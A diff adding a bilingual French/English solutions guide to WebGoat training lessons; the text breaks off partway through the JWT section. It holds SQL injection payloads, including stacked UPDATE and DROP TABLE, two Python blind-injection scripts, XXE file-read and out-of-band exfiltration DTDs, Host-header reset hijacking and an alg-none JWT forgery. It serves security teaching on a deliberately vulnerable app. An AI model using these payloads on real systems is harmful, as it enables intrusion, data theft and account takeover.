@@ -1,0 +1,790 @@
+<div>
+    <h4><u><b>Introduction:</b></u></h4>
+    <div>
+        <div><br></div>
+        <h5>WebGoat</h5>
+        <div><br></div>
+        <span class="multilang" lang="fr">1. Lire la leçon.</span>
+        <span class="multilang" lang="en">1. Read the lesson.</span>
+    </div>
+    <div>
+        <div><br></div>
+        <h5>WebWolf</h5>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            3. Envoyer un email à <code>{utilisateur}@...</code>. Aller sur http://host:port/WebWolf. 
+            S'identifer puis aller lire le mail reçu.
+            <br>
+            <br>
+            4. Le champ <b>Save</b> sur la page permettant de réinitialiser son mot de passe semble buggé. 
+            Il effectue un <code>POST</code> vers http://webwolf:9090/landing, 
+            qui n'est pas une adresse valide avec l'installation de base via Docker. 
+            Toutefois en examinant le code source de la page, on observe que le <i>code unique</i> est le même qu'à la question 3.
+            <br>
+            Il est aussi possible de déclencher la manipulation attendue en effectuant un <code>POST</code> vers http://host:port/landing.
+        </span>
+        <span class="multilang" lang="en">
+            3. Send an email to <code>{user}@...</code>. Go to http://host:port/WebWolf. Log in and go read the mail received.
+            <br>
+            <br>
+            4. The <b>Save</b> field on the reset password page appears to be buggy. It performs a <code>POST</code> to 
+            <a href="http://webwolf:9090/landing">http://webwolf:9090/landing </a>, which is not a valid address with the basic installation via Docker. 
+            However, when looking at the source code of the page, we see that the <i>unique code</i> is the same as in question 3.
+            <br>
+            It is also possible to trigger the expected manipulation by performing a <code>POST</code> to http://host:port/landing.
+        </span>
+    </div>
+</div>
+
+<div><br></div>
+<div><br></div>
+
+<div>
+    <h4><u><b>General:</b></u></h4>
+    <div>
+        <div><br></div>
+        <h5>HTTP Basics</h5>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            2. Enter un nom et appuyer sur <b>Go!</b>.
+            <br>
+            <br>
+            3. Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>. 
+            Remplir les champs sur <b>WebGoat</b> avec <code>POST</code> ou <code>GET</code> et un nombre aléatoire, 
+            et cliquer sur <b>Go!</b>.  Récupérer le <code>magic_num</code> dans le corps de la requête, 
+            repérer que la requête est un <code>POST</code> et recliquer sur <b>Go!</b> avec les bons paramètres.
+        </span>
+        <span class="multilang" lang="en">
+            2. Enter your name and press <b>Go!</b>.
+            <br>
+            <br>
+            3. Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab. 
+            Fill out the fields on <b>WebGoat</b> with <code>POST</code> or <code> GET</code> and a random number, 
+            and click on <b>Go!</b>. Retrieve the <code>magic_num</code> in the body of the request, 
+            find that the request is a <code>POST</code> and re-apply on <b> Go!</b> with the correct parameters.
+        </span>
+    </div>
+    <div>
+        <div><br></div>
+        <h5>HTTP Proxies</h5>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            6. Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>. Cliquer sur <b>Submit</b> et repérer la requête. Cliquer sur <i>Modifier et renvoyer</i> et effectuer les actions suivantes :
+        </span>
+        <span class="multilang" lang="en">
+            6. Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab. Click on <b>Submit</b> and locate the query. Click <i>Edit and Resend</i> and perform the following actions:
+        </span>
+        <div><br></div>
+        <ul>
+            <li>
+                <span class="multilang" lang="fr">
+                    Changer la méthode de <code>POST</code> à <code>GET</code>.
+                </span>
+                <span class="multilang" lang="en">
+                    Change the <code>POST</code> method to <code>GET</code>.
+                </span>
+            </li>
+            <li>
+                <span class="multilang" lang="fr">
+                    Changer l'URL de http://host:port/WebGoat/HttpProxies/intercept-request à 
+                    <a href="http://host/WebGoat/HttpProxies/intercept-request?Requests%20are%20tampered%20easily=doesn't%20matter%20really"></a>http://host:port/WebGoat/HttpProxies/intercept-request?Requests%20are%20tampered%20easily=doesn't%20matter%20really</a>.
+                </span>
+                <span class="multilang" lang="en">
+                    Change the URL from http://host:port/WebGoat/HttpProxies/intercept-request to 
+                    <a href="http://host/WebGoat/HttpProxies/intercept-request?Requests%20are%20tampered%20easily=doesn't%20matter%20really"> http://host:port/WebGoat/HttpProxies/intercept-request?Requests%20are%20tampered%20easily=does%20not%20matter%20really</a>.
+                </span>
+            </li>
+            <li>
+                <span class="multilang" lang="fr">
+                    Ajouter dans les en-têtes de requête <code>x-request-intercepted:true</code>.
+                </span>
+                <span class="multilang" lang="en">
+                    Add in request headers <code>x-request-intercepted: true</code>.
+                </span>
+            </li>
+            <li>
+                <span class="multilang" lang="fr">
+                    Effacer le corps de la requête.
+                </span>
+                <span class="multilang" lang="en">
+                    Clear the body of the query.
+                </span>
+            </li>
+        </ul>
+    </div>
+    <div>
+        <div><br></div>
+        <h5>CIA triad</h5>
+        <div><br></div>
+        5.
+        <div><br></div>
+        <b>1. How could an intruder harm the security goal of confidentiality?</b>
+        <div><br></div>
+        Solution 3: By stealing a database where names and emails are stored and uploading it to a website.
+        <div><br></div>
+        <b>2. How could an intruder harm the security goal of integrity?</b>
+        <div><br></div>
+        Solution 1: By changing the names and emails of one or more users stored in a database.
+        <div><br></div>
+        <b>3. How could an intruder harm the security goal of availability?</b>
+        <div><br></div>
+        Solution 4: By launching a denial of service attack on the servers.
+        <div><br></div>
+        <b>4. What happens if at least one of the CIA security goals is harmed?</b>
+        <div><br></div>
+        Solution 2: The systems security is compromised even if only one goal is harmed.
+        <div><br></div>
+    </div>
+    <div>
+        <div><br></div>
+        <h5>Google Chrome Developer Tools</h5>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+		4. Suivre la consigne.
+		<br>
+		<br>
+		6. Retrouver l'en-tête à l'aide de l'onglet <i>Réseau</i> des <i>Outils de développement</i>.
+		<br>
+		<br>
+        Remarque importante : ces leçons sont les premières leçons d'un grand nombre de leçon buggée au niveau de l'interface graphique. Le numéro d'exercice ne devient pas vert malgré le message de réussite. Voir ce <a href="https://github.com/WebGoat/WebGoat/issues/619">topic</a>.
+        </span>
+        <span class="multilang" lang="en">
+		4. Follow the instructions.
+		<br>
+		<br>
+		6. Retrieve the header using the <i>Network</i> tab of the <i>Development Tools</i>.
+		<br>
+		<br>
+        Important note: These lessons are the first lessons of a lot of buggy lesson at the GUI. The exercise number does not turn green despite the success message. See this <a href="https://github.com/WebGoat/WebGoat/issues/619"> topic </a>.
+        </span>
+    </div>
+</div>
+
+<div><br></div>
+<div><br></div>
+
+<div>
+    <h4><u><b>Injection Flaws:</b></u></h4>
+    <div><br></div>
+    <div>
+        <h5>SQL Injection (introduction)</h5>
+        <div><br></div>
+        2. <code>SELECT department FROM employees WHERE first_name='Bob'</code>
+        <div><br></div>
+        3. <code>UPDATE employees SET department='Sales' WHERE first_name='Tobi'</code>
+        <div><br></div>
+        4. <code>ALTER TABLE employees ADD phone varchar(20)</code>
+        <div><br></div>
+        5. <code>GRANT ALTER TABLE TO UnauthorizedUser</code>
+        <div><br></div>
+        9. <code>'</code> + <code>or</code> + <code>'1'='1</code>
+        <div><br></div>
+        10. Login_count: <code>0</code> User_Id: <code>0 OR 1=1</code>
+        <div><br></div>
+        11. Employee Name: <code>A</code> Authentication TAN: <code>' OR '1' = '1</code>
+        <div><br></div>
+        12. Employee Name: <code>A</code> Authentication TAN: <code>'; UPDATE employees SET salary=99999 WHERE first_name='John</code>
+        <div><br></div>
+        13. <code>%'; DROP TABLE access_log;--</code>
+        <div><br></div>
+    </div>
+    <div>
+        <div><br></div>
+        <h5>SQL Injection (advanced)</h5>
+        <div><br></div>
+        3. Name: <code>'; SELECT * FROM user_system_data;--</code> or <code>' UNION SELECT 1, user_name, password, cookie, 'A', 'B', 1 from user_system_data;--</code> Password: <code>passW0rD</code>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            5. Le formulaire <b>Login</b> ne semble pas fournir de résultats utiles à partir de diverses entrées, mais le formulaire 
+            <b>Register</b> nous permet de vérifier si un nom d'utilisateur existe déjà. Si nous essayons de nous inscrire avec le nom d'utilisateur suivant: 
+            <code>tom' AND '1'='1</code> nous constatons que le nom d'utilisateur est pris. 
+            Nous pouvons utiliser cela comme un oracle et vérifier le mot de passe de Tom, une lettre à la fois. 
+            Heureusement, la table que nous recherchons s'appelle <code>password</code>, nous pouvons donc essayer de nous enregistrer avec le nom d'utilisateur suivant: 
+            <code>tom' AND substring(password, 1,1)='t</code> et comme la réponse indique que le nom d'utilisateur existe déjà, 
+            nous savons que <b>t</b> est le premier caractère du mot de passe de Tom. En fuzzing pour les caractères restants, 
+            nous pouvons déterminer que le mot de passe de Tom est <b>thisisasecretfortomonly</b>.
+            <br>
+            Ce challenge peut être un bon exercice pour s'entraîner au scripting. 
+            Ci-dessous, un petit exemple de code Python permettant de retrouver la réponse:
+        </span>
+        <span class="multilang" lang="en">
+            5. The <b>Login</b> form does not appear to provide any useful outputs from a variety of inputs, 
+            but the <b>Register</b> form allows us to check whether a username already exists. 
+            If we try to register with the following username: <code>tom' AND '1'='1</code> we find that the username is taken. 
+            We can use this as an oracle and check what tom's password is one at a time. 
+            Fortunately, the table we are seeking is named <code>password</code>, so we can attempt to register with the following username: 
+            <code>tom' AND substring(password,1,1)='t</code> and because the response states the username already exists, we know that <b>t</b> is the first character of Tom's password. 
+            By fuzzing for the remaining characters, we can determine that Tom's passwordis <b>thisisasecretfortomonly</b>.
+            <br>
+            This challenge can be a good exercise to practice scripting.
+            Below, a small example of Python code to find the answer:
+        </span>
+        <div><br></div>
+        <code>
+            import json
+            <br>
+            import requests
+            <br><br>
+            def sql_injection_advance_5():
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; alphabet_index = 0
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; alphabet = 'abcdefghijklmnopqrstuvwxyz'
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; password_index = 0
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; password = ''
+            <br><br>
+            &nbsp;&nbsp;&nbsp;&nbsp; headers = {
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Cookie': 'JSESSIONID=id',
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; }
+            <br>
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; while True:
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; payload = 'tom\' AND substring(password,{},1)=\'{}'.format(password_index + 1, alphabet[alphabet_index])
+            <br>
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; data = {
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'username_reg': payload,
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'email_reg': 'a@a',
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'password_reg': 'a',
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'confirm_password_reg': 'a'
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } 
+            <br>
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r = requests.put('http://host:port/WebGoat/SqlInjection/challenge', headers=headers, data=data)
+            <br>
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try:
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; response = json.loads(r.text)
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; except:
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
+            <br>
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if "already exists please try to register with a different username" not in response['feedback']:
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alphabet_index += 1
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if alphabet_index &gt; len(alphabet) - 1:
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else:
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; password += alphabet[alphabet_index]
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print(password)
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alphabet_index = 0
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; password_index += 1
+            <br>
+            <br>
+            sql_injection_advance_5()
+        </code>
+    </div>
+    <div><br></div>
+    6.
+    <div><br></div>
+    <b>1. What is the difference between a prepared statement and a statement?</b>
+    <div><br></div>
+    Solution 4: A statement has got values instead of a prepared statement
+    <div><br></div>
+    <b>2. Which one of the following characters is a placeholder for variables?</b>
+    <div><br></div>
+    Solution 3: ?
+    <div><br></div>
+    <b>3. How can prepared statements be faster than statements?</b>
+    <div><br></div>
+    Solution 2: Prepared statements are compiled once by the database management system waiting for input and are pre-compiled this way.
+    <div><br></div>
+    <b>4. How can a prepared statement prevent SQL-Injection?</b>
+    <div><br></div>
+    Solution 3: Placeholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and data.
+    <div><br></div>
+    <b>5. What happens if a person with malicious intent writes into a register form :Robert); DROP TABLE Students;-- that has a prepared statement?</b>
+    <div><br></div>
+    Solution 4: The database registers 'Robert' ); DROP TABLE Students;--'.
+    <div><br></div>
+    <div>
+        <div><br></div>
+        <h5>SQL Injection (mitigation)</h5>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            5. Les cases doivent contenir les mots suivants pour valider la leçon : 
+        </span> 
+        <span class="multilang" lang="en">
+            5. The fields must contain the following words to validate the lesson:
+        </span> 
+        <code>getConnection</code>, 
+        <code>PreparedStatement</code>, 
+        <code>prepareStatement</code>, 
+        <code>?</code>, 
+        <code>?</code>, 
+        <code>setString</code>, 
+        <code>setString</code>.
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            6. Ne fonctionne pas ?
+        </span> 
+        <span class="multilang" lang="en">
+            6. Does not work ?
+        </span> 
+        <div><br></div>
+        10.
+        <ul>
+            <li>
+                <span class="multilang" lang="fr">
+                    Trier les colonnes (par IP par exemple) effectue une requête vers http://localhost:8080/WebGoat/SqlInjection/servers?column=ip.
+                    CCela peut être exploité en interceptant la requête avec les outils de développement du navigateur et en fournissant une requête SQL comme valeur de colonne.
+                </span>
+                <span class="multilang" lang="en">
+                    Click on column sort performs a request to http://localhost:8080/WebGoat/SqlInjection/servers?column=ip. 
+                    This can be exploited by intercepting the request with Browser Tools and providing prepared string as column value.
+                </span>
+            </li>
+            <li>
+                <span class="multilang" lang="fr">
+                    Pour avoir une idée de l'adresse IP de <b>webgoat-prd</b>, il faut trouver le nom des colonnes dans les tables pour les noms de serveur et les IP.
+                    La supposition évidente est <b>servers</b> and <b>ip</b>.
+                    <br>
+                    <code>column=(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)</code>
+                </span>
+                <span class="multilang" lang="en">
+                    To get the idea about <b>webgoat-prd</b> IP address we first have to find out the table name and ip column name. 
+                    The obvious guess is <b>servers</b> and <b>ip</b>:
+                    <br>
+                    <code>column=(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)</code>
+                </span>
+            </li>
+            <li>
+                <span class="multilang" lang="fr">
+                    Si les noms de table sont corrects, le tableau devrait être trié par <b>ids</b>.
+                </span>
+                <span class="multilang" lang="en">
+                    If that is the correct table and column name, the table will get sorted by <b>ids</b>.
+                </span>
+            </li>
+            <li>
+                <span class="multilang" lang="fr">
+                    C'est le cas, la supposition était donc correcte.
+                </span>
+                <span class="multilang" lang="en">
+                    So after intercepting and changing the request we get the table sorted by <b>ids</b>, the guess was correct.
+                </span>
+            </li>
+            <li>
+                <span class="multilang" lang="fr">
+                    Afin de tester la logique on peut essayer de déclencher une erreur avec :
+                    <br>
+                    <code>column=(CASE WHEN (SELECT ip FROM whatever WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)</code>
+                </span>
+                <span class="multilang" lang="en">
+                    Just to check our logic, lets send request with:
+                    <br>
+                    <code>column=(CASE WHEN (SELECT ip FROM whatever WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)</code>
+                </span>
+            </li>
+            <li>
+                <span class="multilang" lang="fr">
+                    On tombe sur une page d'erreur, on a tout pour écrire le script maintenant.
+                </span>
+                <span class="multilang" lang="en">
+                    It get's an error page, we have everything to script the attack now.
+                </span>
+                <div><br></div>
+                <code>
+                    import json
+                    <br>
+                    import requests
+                    <br>
+                    <br>
+                    def sql_injection_mitigation_10():
+                    <br>
+                    &nbsp;&nbsp;&nbsp;&nbsp; index = 0
+                    <br>
+                    <br>
+                    &nbsp;&nbsp;&nbsp;&nbsp; headers = {
+                    <br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'Cookie': 'JSESSIONID=id'
+                    <br>
+                    &nbsp;&nbsp;&nbsp;&nbsp; }
+                    <br>
+                    <br>
+                    &nbsp;&nbsp;&nbsp;&nbsp; while True:
+                    <br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; payload = '(CASE WHEN (SELECT ip FROM servers WHERE hostname=\'webgoat-prd\') LIKE \'{}.%\' THEN id ELSE hostname END)'.format(index)
+                    <br>
+                    <br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r = requests.get('http://host:port/WebGoat/SqlInjection/servers?column=' + payload, headers=headers)
+                    <br>
+                    <br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try:
+                    <br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; response = json.loads(r.text)
+                    <br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; except:
+                    <br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
+                    <br>
+                    <br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if response[0]['id'] == '1':
+                    <br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print('webgoat-prd IP: {}.130.219.202'.format(index))
+                    <br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return
+                    <br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else:
+                    <br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; index += 1
+                    <br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if index > 255:
+                    <br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print("No IP found")
+                    <br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return
+                    <br>
+                    <br>
+                    sql_injection_mitigation_10()
+                </code>
+            </li>
+        </ul>
+    </div>
+    <div>
+        <div><br></div>
+        <h5>XXE</h5>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            3. Intercepter la requête et modifier le corps avec la chaîne suivante : 
+            <br>
+            Si WebGoat tourne sous Linux: <code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE comment [&lt;!ENTITY xxe SYSTEM "file:///"&gt;]>&lt;comment&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/comment&gt;</code>
+            <br>
+            Si WebGoat tourne sous Windows: <code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE comment [&lt;!ENTITY xxe SYSTEM "file://C:/"&gt;]>&lt;comment&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/comment&gt;</code>
+            <br>
+            <br>
+            4. Le payload est le même que précédemment, mais il faut modifier l'en-tête <code>Content-Type: application/json</code> en <code>Content-Type: application/xml</code>
+            <br>
+            <br>
+            6. Même si ce n'est pas un challenge, une petite erreur s'est glissée dans la leçon, faire attention à rentrer les bonnes URL pour pouvoir effectuer le test.
+        </span>
+        <span class="multilang" lang="en">
+            3. Intercept the request and modify the body with the following string : 
+            <br>
+            If WebGoat run on Linux: <code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE comment [&lt;!ENTITY xxe SYSTEM "file:///"&gt;]>&lt;comment&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/comment&gt;</code>
+            <br>
+            If WebGoat run on Windows: <code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE comment [&lt;!ENTITY xxe SYSTEM "file://C:/"&gt;]>&lt;comment&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/comment&gt;</code>
+            <br>
+            <br>
+            4. The payload is the same as before, but you have to change the header <code>Content-Type: application/json</code> to <code>Content-Type: application/xml</code>
+            <br>
+            <br>
+            6. Although it is not a challenge, a small mistake has crept into the lesson, be careful to enter the right URL to be able to perform the test.
+        </span>
+        <br>
+        <br>
+        <b>attack.dtd</b>
+        <br>
+        <code>
+            &lt;?xml version="1.0" encoding="UTF-8"?&gt;
+            <br>
+            &lt;!ENTITY ping SYSTEM 'http://host:port/landing?test=HelloWorld' &gt;
+        </code>
+        <br>
+        <br>
+        <b>Request Body</b>
+        <br>
+        <code>
+            &lt;?xml version="1.0"?&gt;
+            <br>
+            &lt;!DOCTYPE root [
+            <br>
+            &lt;!ENTITY % remote SYSTEM "http://host:port/files/username/attack.dtd" &gt;
+            <br>
+            %remote;
+            <br>
+            ]&gt;
+            <br>
+            &lt;comment&gt;
+            <br>
+            &lt;text>test&amp;ping;&lt;/text&gt;
+            <br>
+            &lt;/comment&gt;
+            <br>
+        </code>
+        <br>
+        <br>
+        <span class="multilang" lang="fr">
+            7. Envoyer <b>contents_file.dtd</b> vers <b>WebWolf</b>, et changer le corps de la requête par celui présent ci-dessous.
+        </span>
+        <span class="multilang" lang="en">
+            7. Upload <b>contents_file.dtd</b> on <b>WebWolf</b>, and change the request body by the one present below.
+        </span>
+        <br>
+        <br>
+        <b>contents_file.dtd</b>
+        <br>
+        <code>
+            &lt;?xml version="1.0" encoding="UTF-8"?&gt;
+            <br>
+            &lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://host:port/landing?%file;' &gt;" &gt;%all;
+        </code>
+        <br>
+        <br>
+        <b>Request Body</b>
+        <br>
+        <code>
+            &lt;?xml version="1.0" encoding="UTF-8"?&gt;
+            <br>
+            &lt;!DOCTYPE xxe [
+            <br>
+            &lt;!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt" &gt;
+            <br>
+            &lt;!ENTITY % dtd SYSTEM "http://host:port/files/username/contents_file.dtd" &gt;
+            <br>
+            %dtd;]&gt;
+            <br>
+            &lt;comment&gt;
+            <br>
+            &lt;text&gt;test&amp;send;&lt;/text&gt;
+            <br>
+            &lt;/comment&gt;
+        </code>
+    </div>
+</div>
+<div><br></div>
+<div><br></div>
+<div>
+    <h4><u><b>Authentification Flaws:</b></u></h4>
+    <div>
+        <div><br></div>
+        <h5>Secure Passwords</h5>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            4. La vérification utilise la bibliothèque https://github.com/dropbox/zxcvbn pour vérifier la force du mot de passe. 
+        </span>
+        <span class="multilang" lang="en">
+            4. The verification algorithm to check the password strength can be found here https://github.com/dropbox/zxcvbn .
+        </span>
+    </div>
+    <div>
+        <div><br></div>
+        <h5>Password reset</h5>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            2. Cliquer sur <b>Forgot your password?</b>. Renseigner l'adresse mail <code>{utilisateur}@...</code>, puis ouvrir le mail sur <b>WebWolf</b> afin de récupérer le nouveau mot de passe.
+        </span>
+        <span class="multilang" lang="en">
+            2. Click on <b>Forgot your password?</b>. Enter the email address <code>{user}@...</code>, then open the mail on <b>WebWolf</b> to retrieve the new password.
+        </span>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            4. Les identifiants valides sont: admin, green / jerry, orange / tom, purple / larry, yellow.
+        </span>
+        <span class="multilang" lang="en">
+            4. Valid credentials are: admin, green / jerry, orange / tom, purple / larry, yellow.
+        </span>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            5. Lire les différents conseils.
+        </span>
+        <span class="multilang" lang="en">
+            5. Read the advices.
+        </span>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            6. Envoyer un mail à tom@webgoat-cloud.org et intercepter la requête.
+            <br>
+            Modifier l'en-tête <code>Host: host:webgoat_port</code> en <code>Host: host:webwolf_port</code> et renvoyer une requête.
+            <br>
+            Sur <b>WebWolf</b>, aller dans <b>Incoming requests</b>, récupérer la variable <code>path</code> et aller à l'URL http://host:webgoat_port/WebGoat/path.
+            <br>
+            Changer le mot de passe et valider le challenge avec ce dernier (validation buggée).
+        </span>
+        <span class="multilang" lang="en">
+            6. Send an email to tom@webgoat-cloud.org and intercept the request.
+            <br>
+            Change the <code>Host: host: webgoat_port</code> header to <code>Host: host: webwolf_port</code> and return a request.
+            <br>
+            On <b>WebWolf</b>, go to <b>Incoming requests</b>, retrieve the variable <code>path</code> and go to the URL http://host:webgoat_port/WebGoat/path .
+            <br>
+            Change the password and validate the challenge with the latter (validation bugged).
+        </span>
+    </div>
+    <div>
+        <div><br></div>
+        <h5>Authentification Bypasses</h5>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            2. Intercepter la requête. 
+            <br>
+            Modifier les paramètres <code>secQuestion0=a&secQuestion1=a&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746</code> en <code>secQuestion2=a&secQuestion3=a&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746</code>
+        </span>
+        <span class="multilang" lang="en">
+            2. Intercept the request. 
+            <br>
+            Modify the parameters <code>secQuestion0=a&secQuestion1=a&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746</code> to <code>secQuestion2=a&secQuestion3=a&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746</code>
+        </span>
+    </div>
+    <div>
+        <div><br></div>
+        <h5>JWT tokens</h5>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            4. Se connecter avec Tom et cliquer sur <b>Reset Votes</b>. 
+            <br>
+            Intercepter la requête et remarquer l'en-tête: <code>Cookie: access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0._gPSRvB9wAAruFwaDgivXp4n5rHQFi5hTOJsVFqCkR9ZDUf3LhCgJQuTIIpTGnZIS3XWL9MHZGaExJC7XhIiXA</code>
+            <br>
+            En base64, cela se décode en : <code>{"alg":"HS512"}.{"iat":1564402244,"admin":"false","user":"Tom"}.signature</code>
+            <br>
+            Le modifier en <code>{"alg":null}.{"iat":1564402244,"admin":"true","user":"Tom"}.</code>, 
+            le ré-encoder en base64 (<code>eyJhbGciOiBudWxsfQ==.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==.</code>) 
+            et renvoyer la requête pour valider la leçon (validation buggée).
+        </span>
+        <span class="multilang" lang="en">
+            4. Log in as Tom and click on <b>Reset Votes</b>.
+            <br>
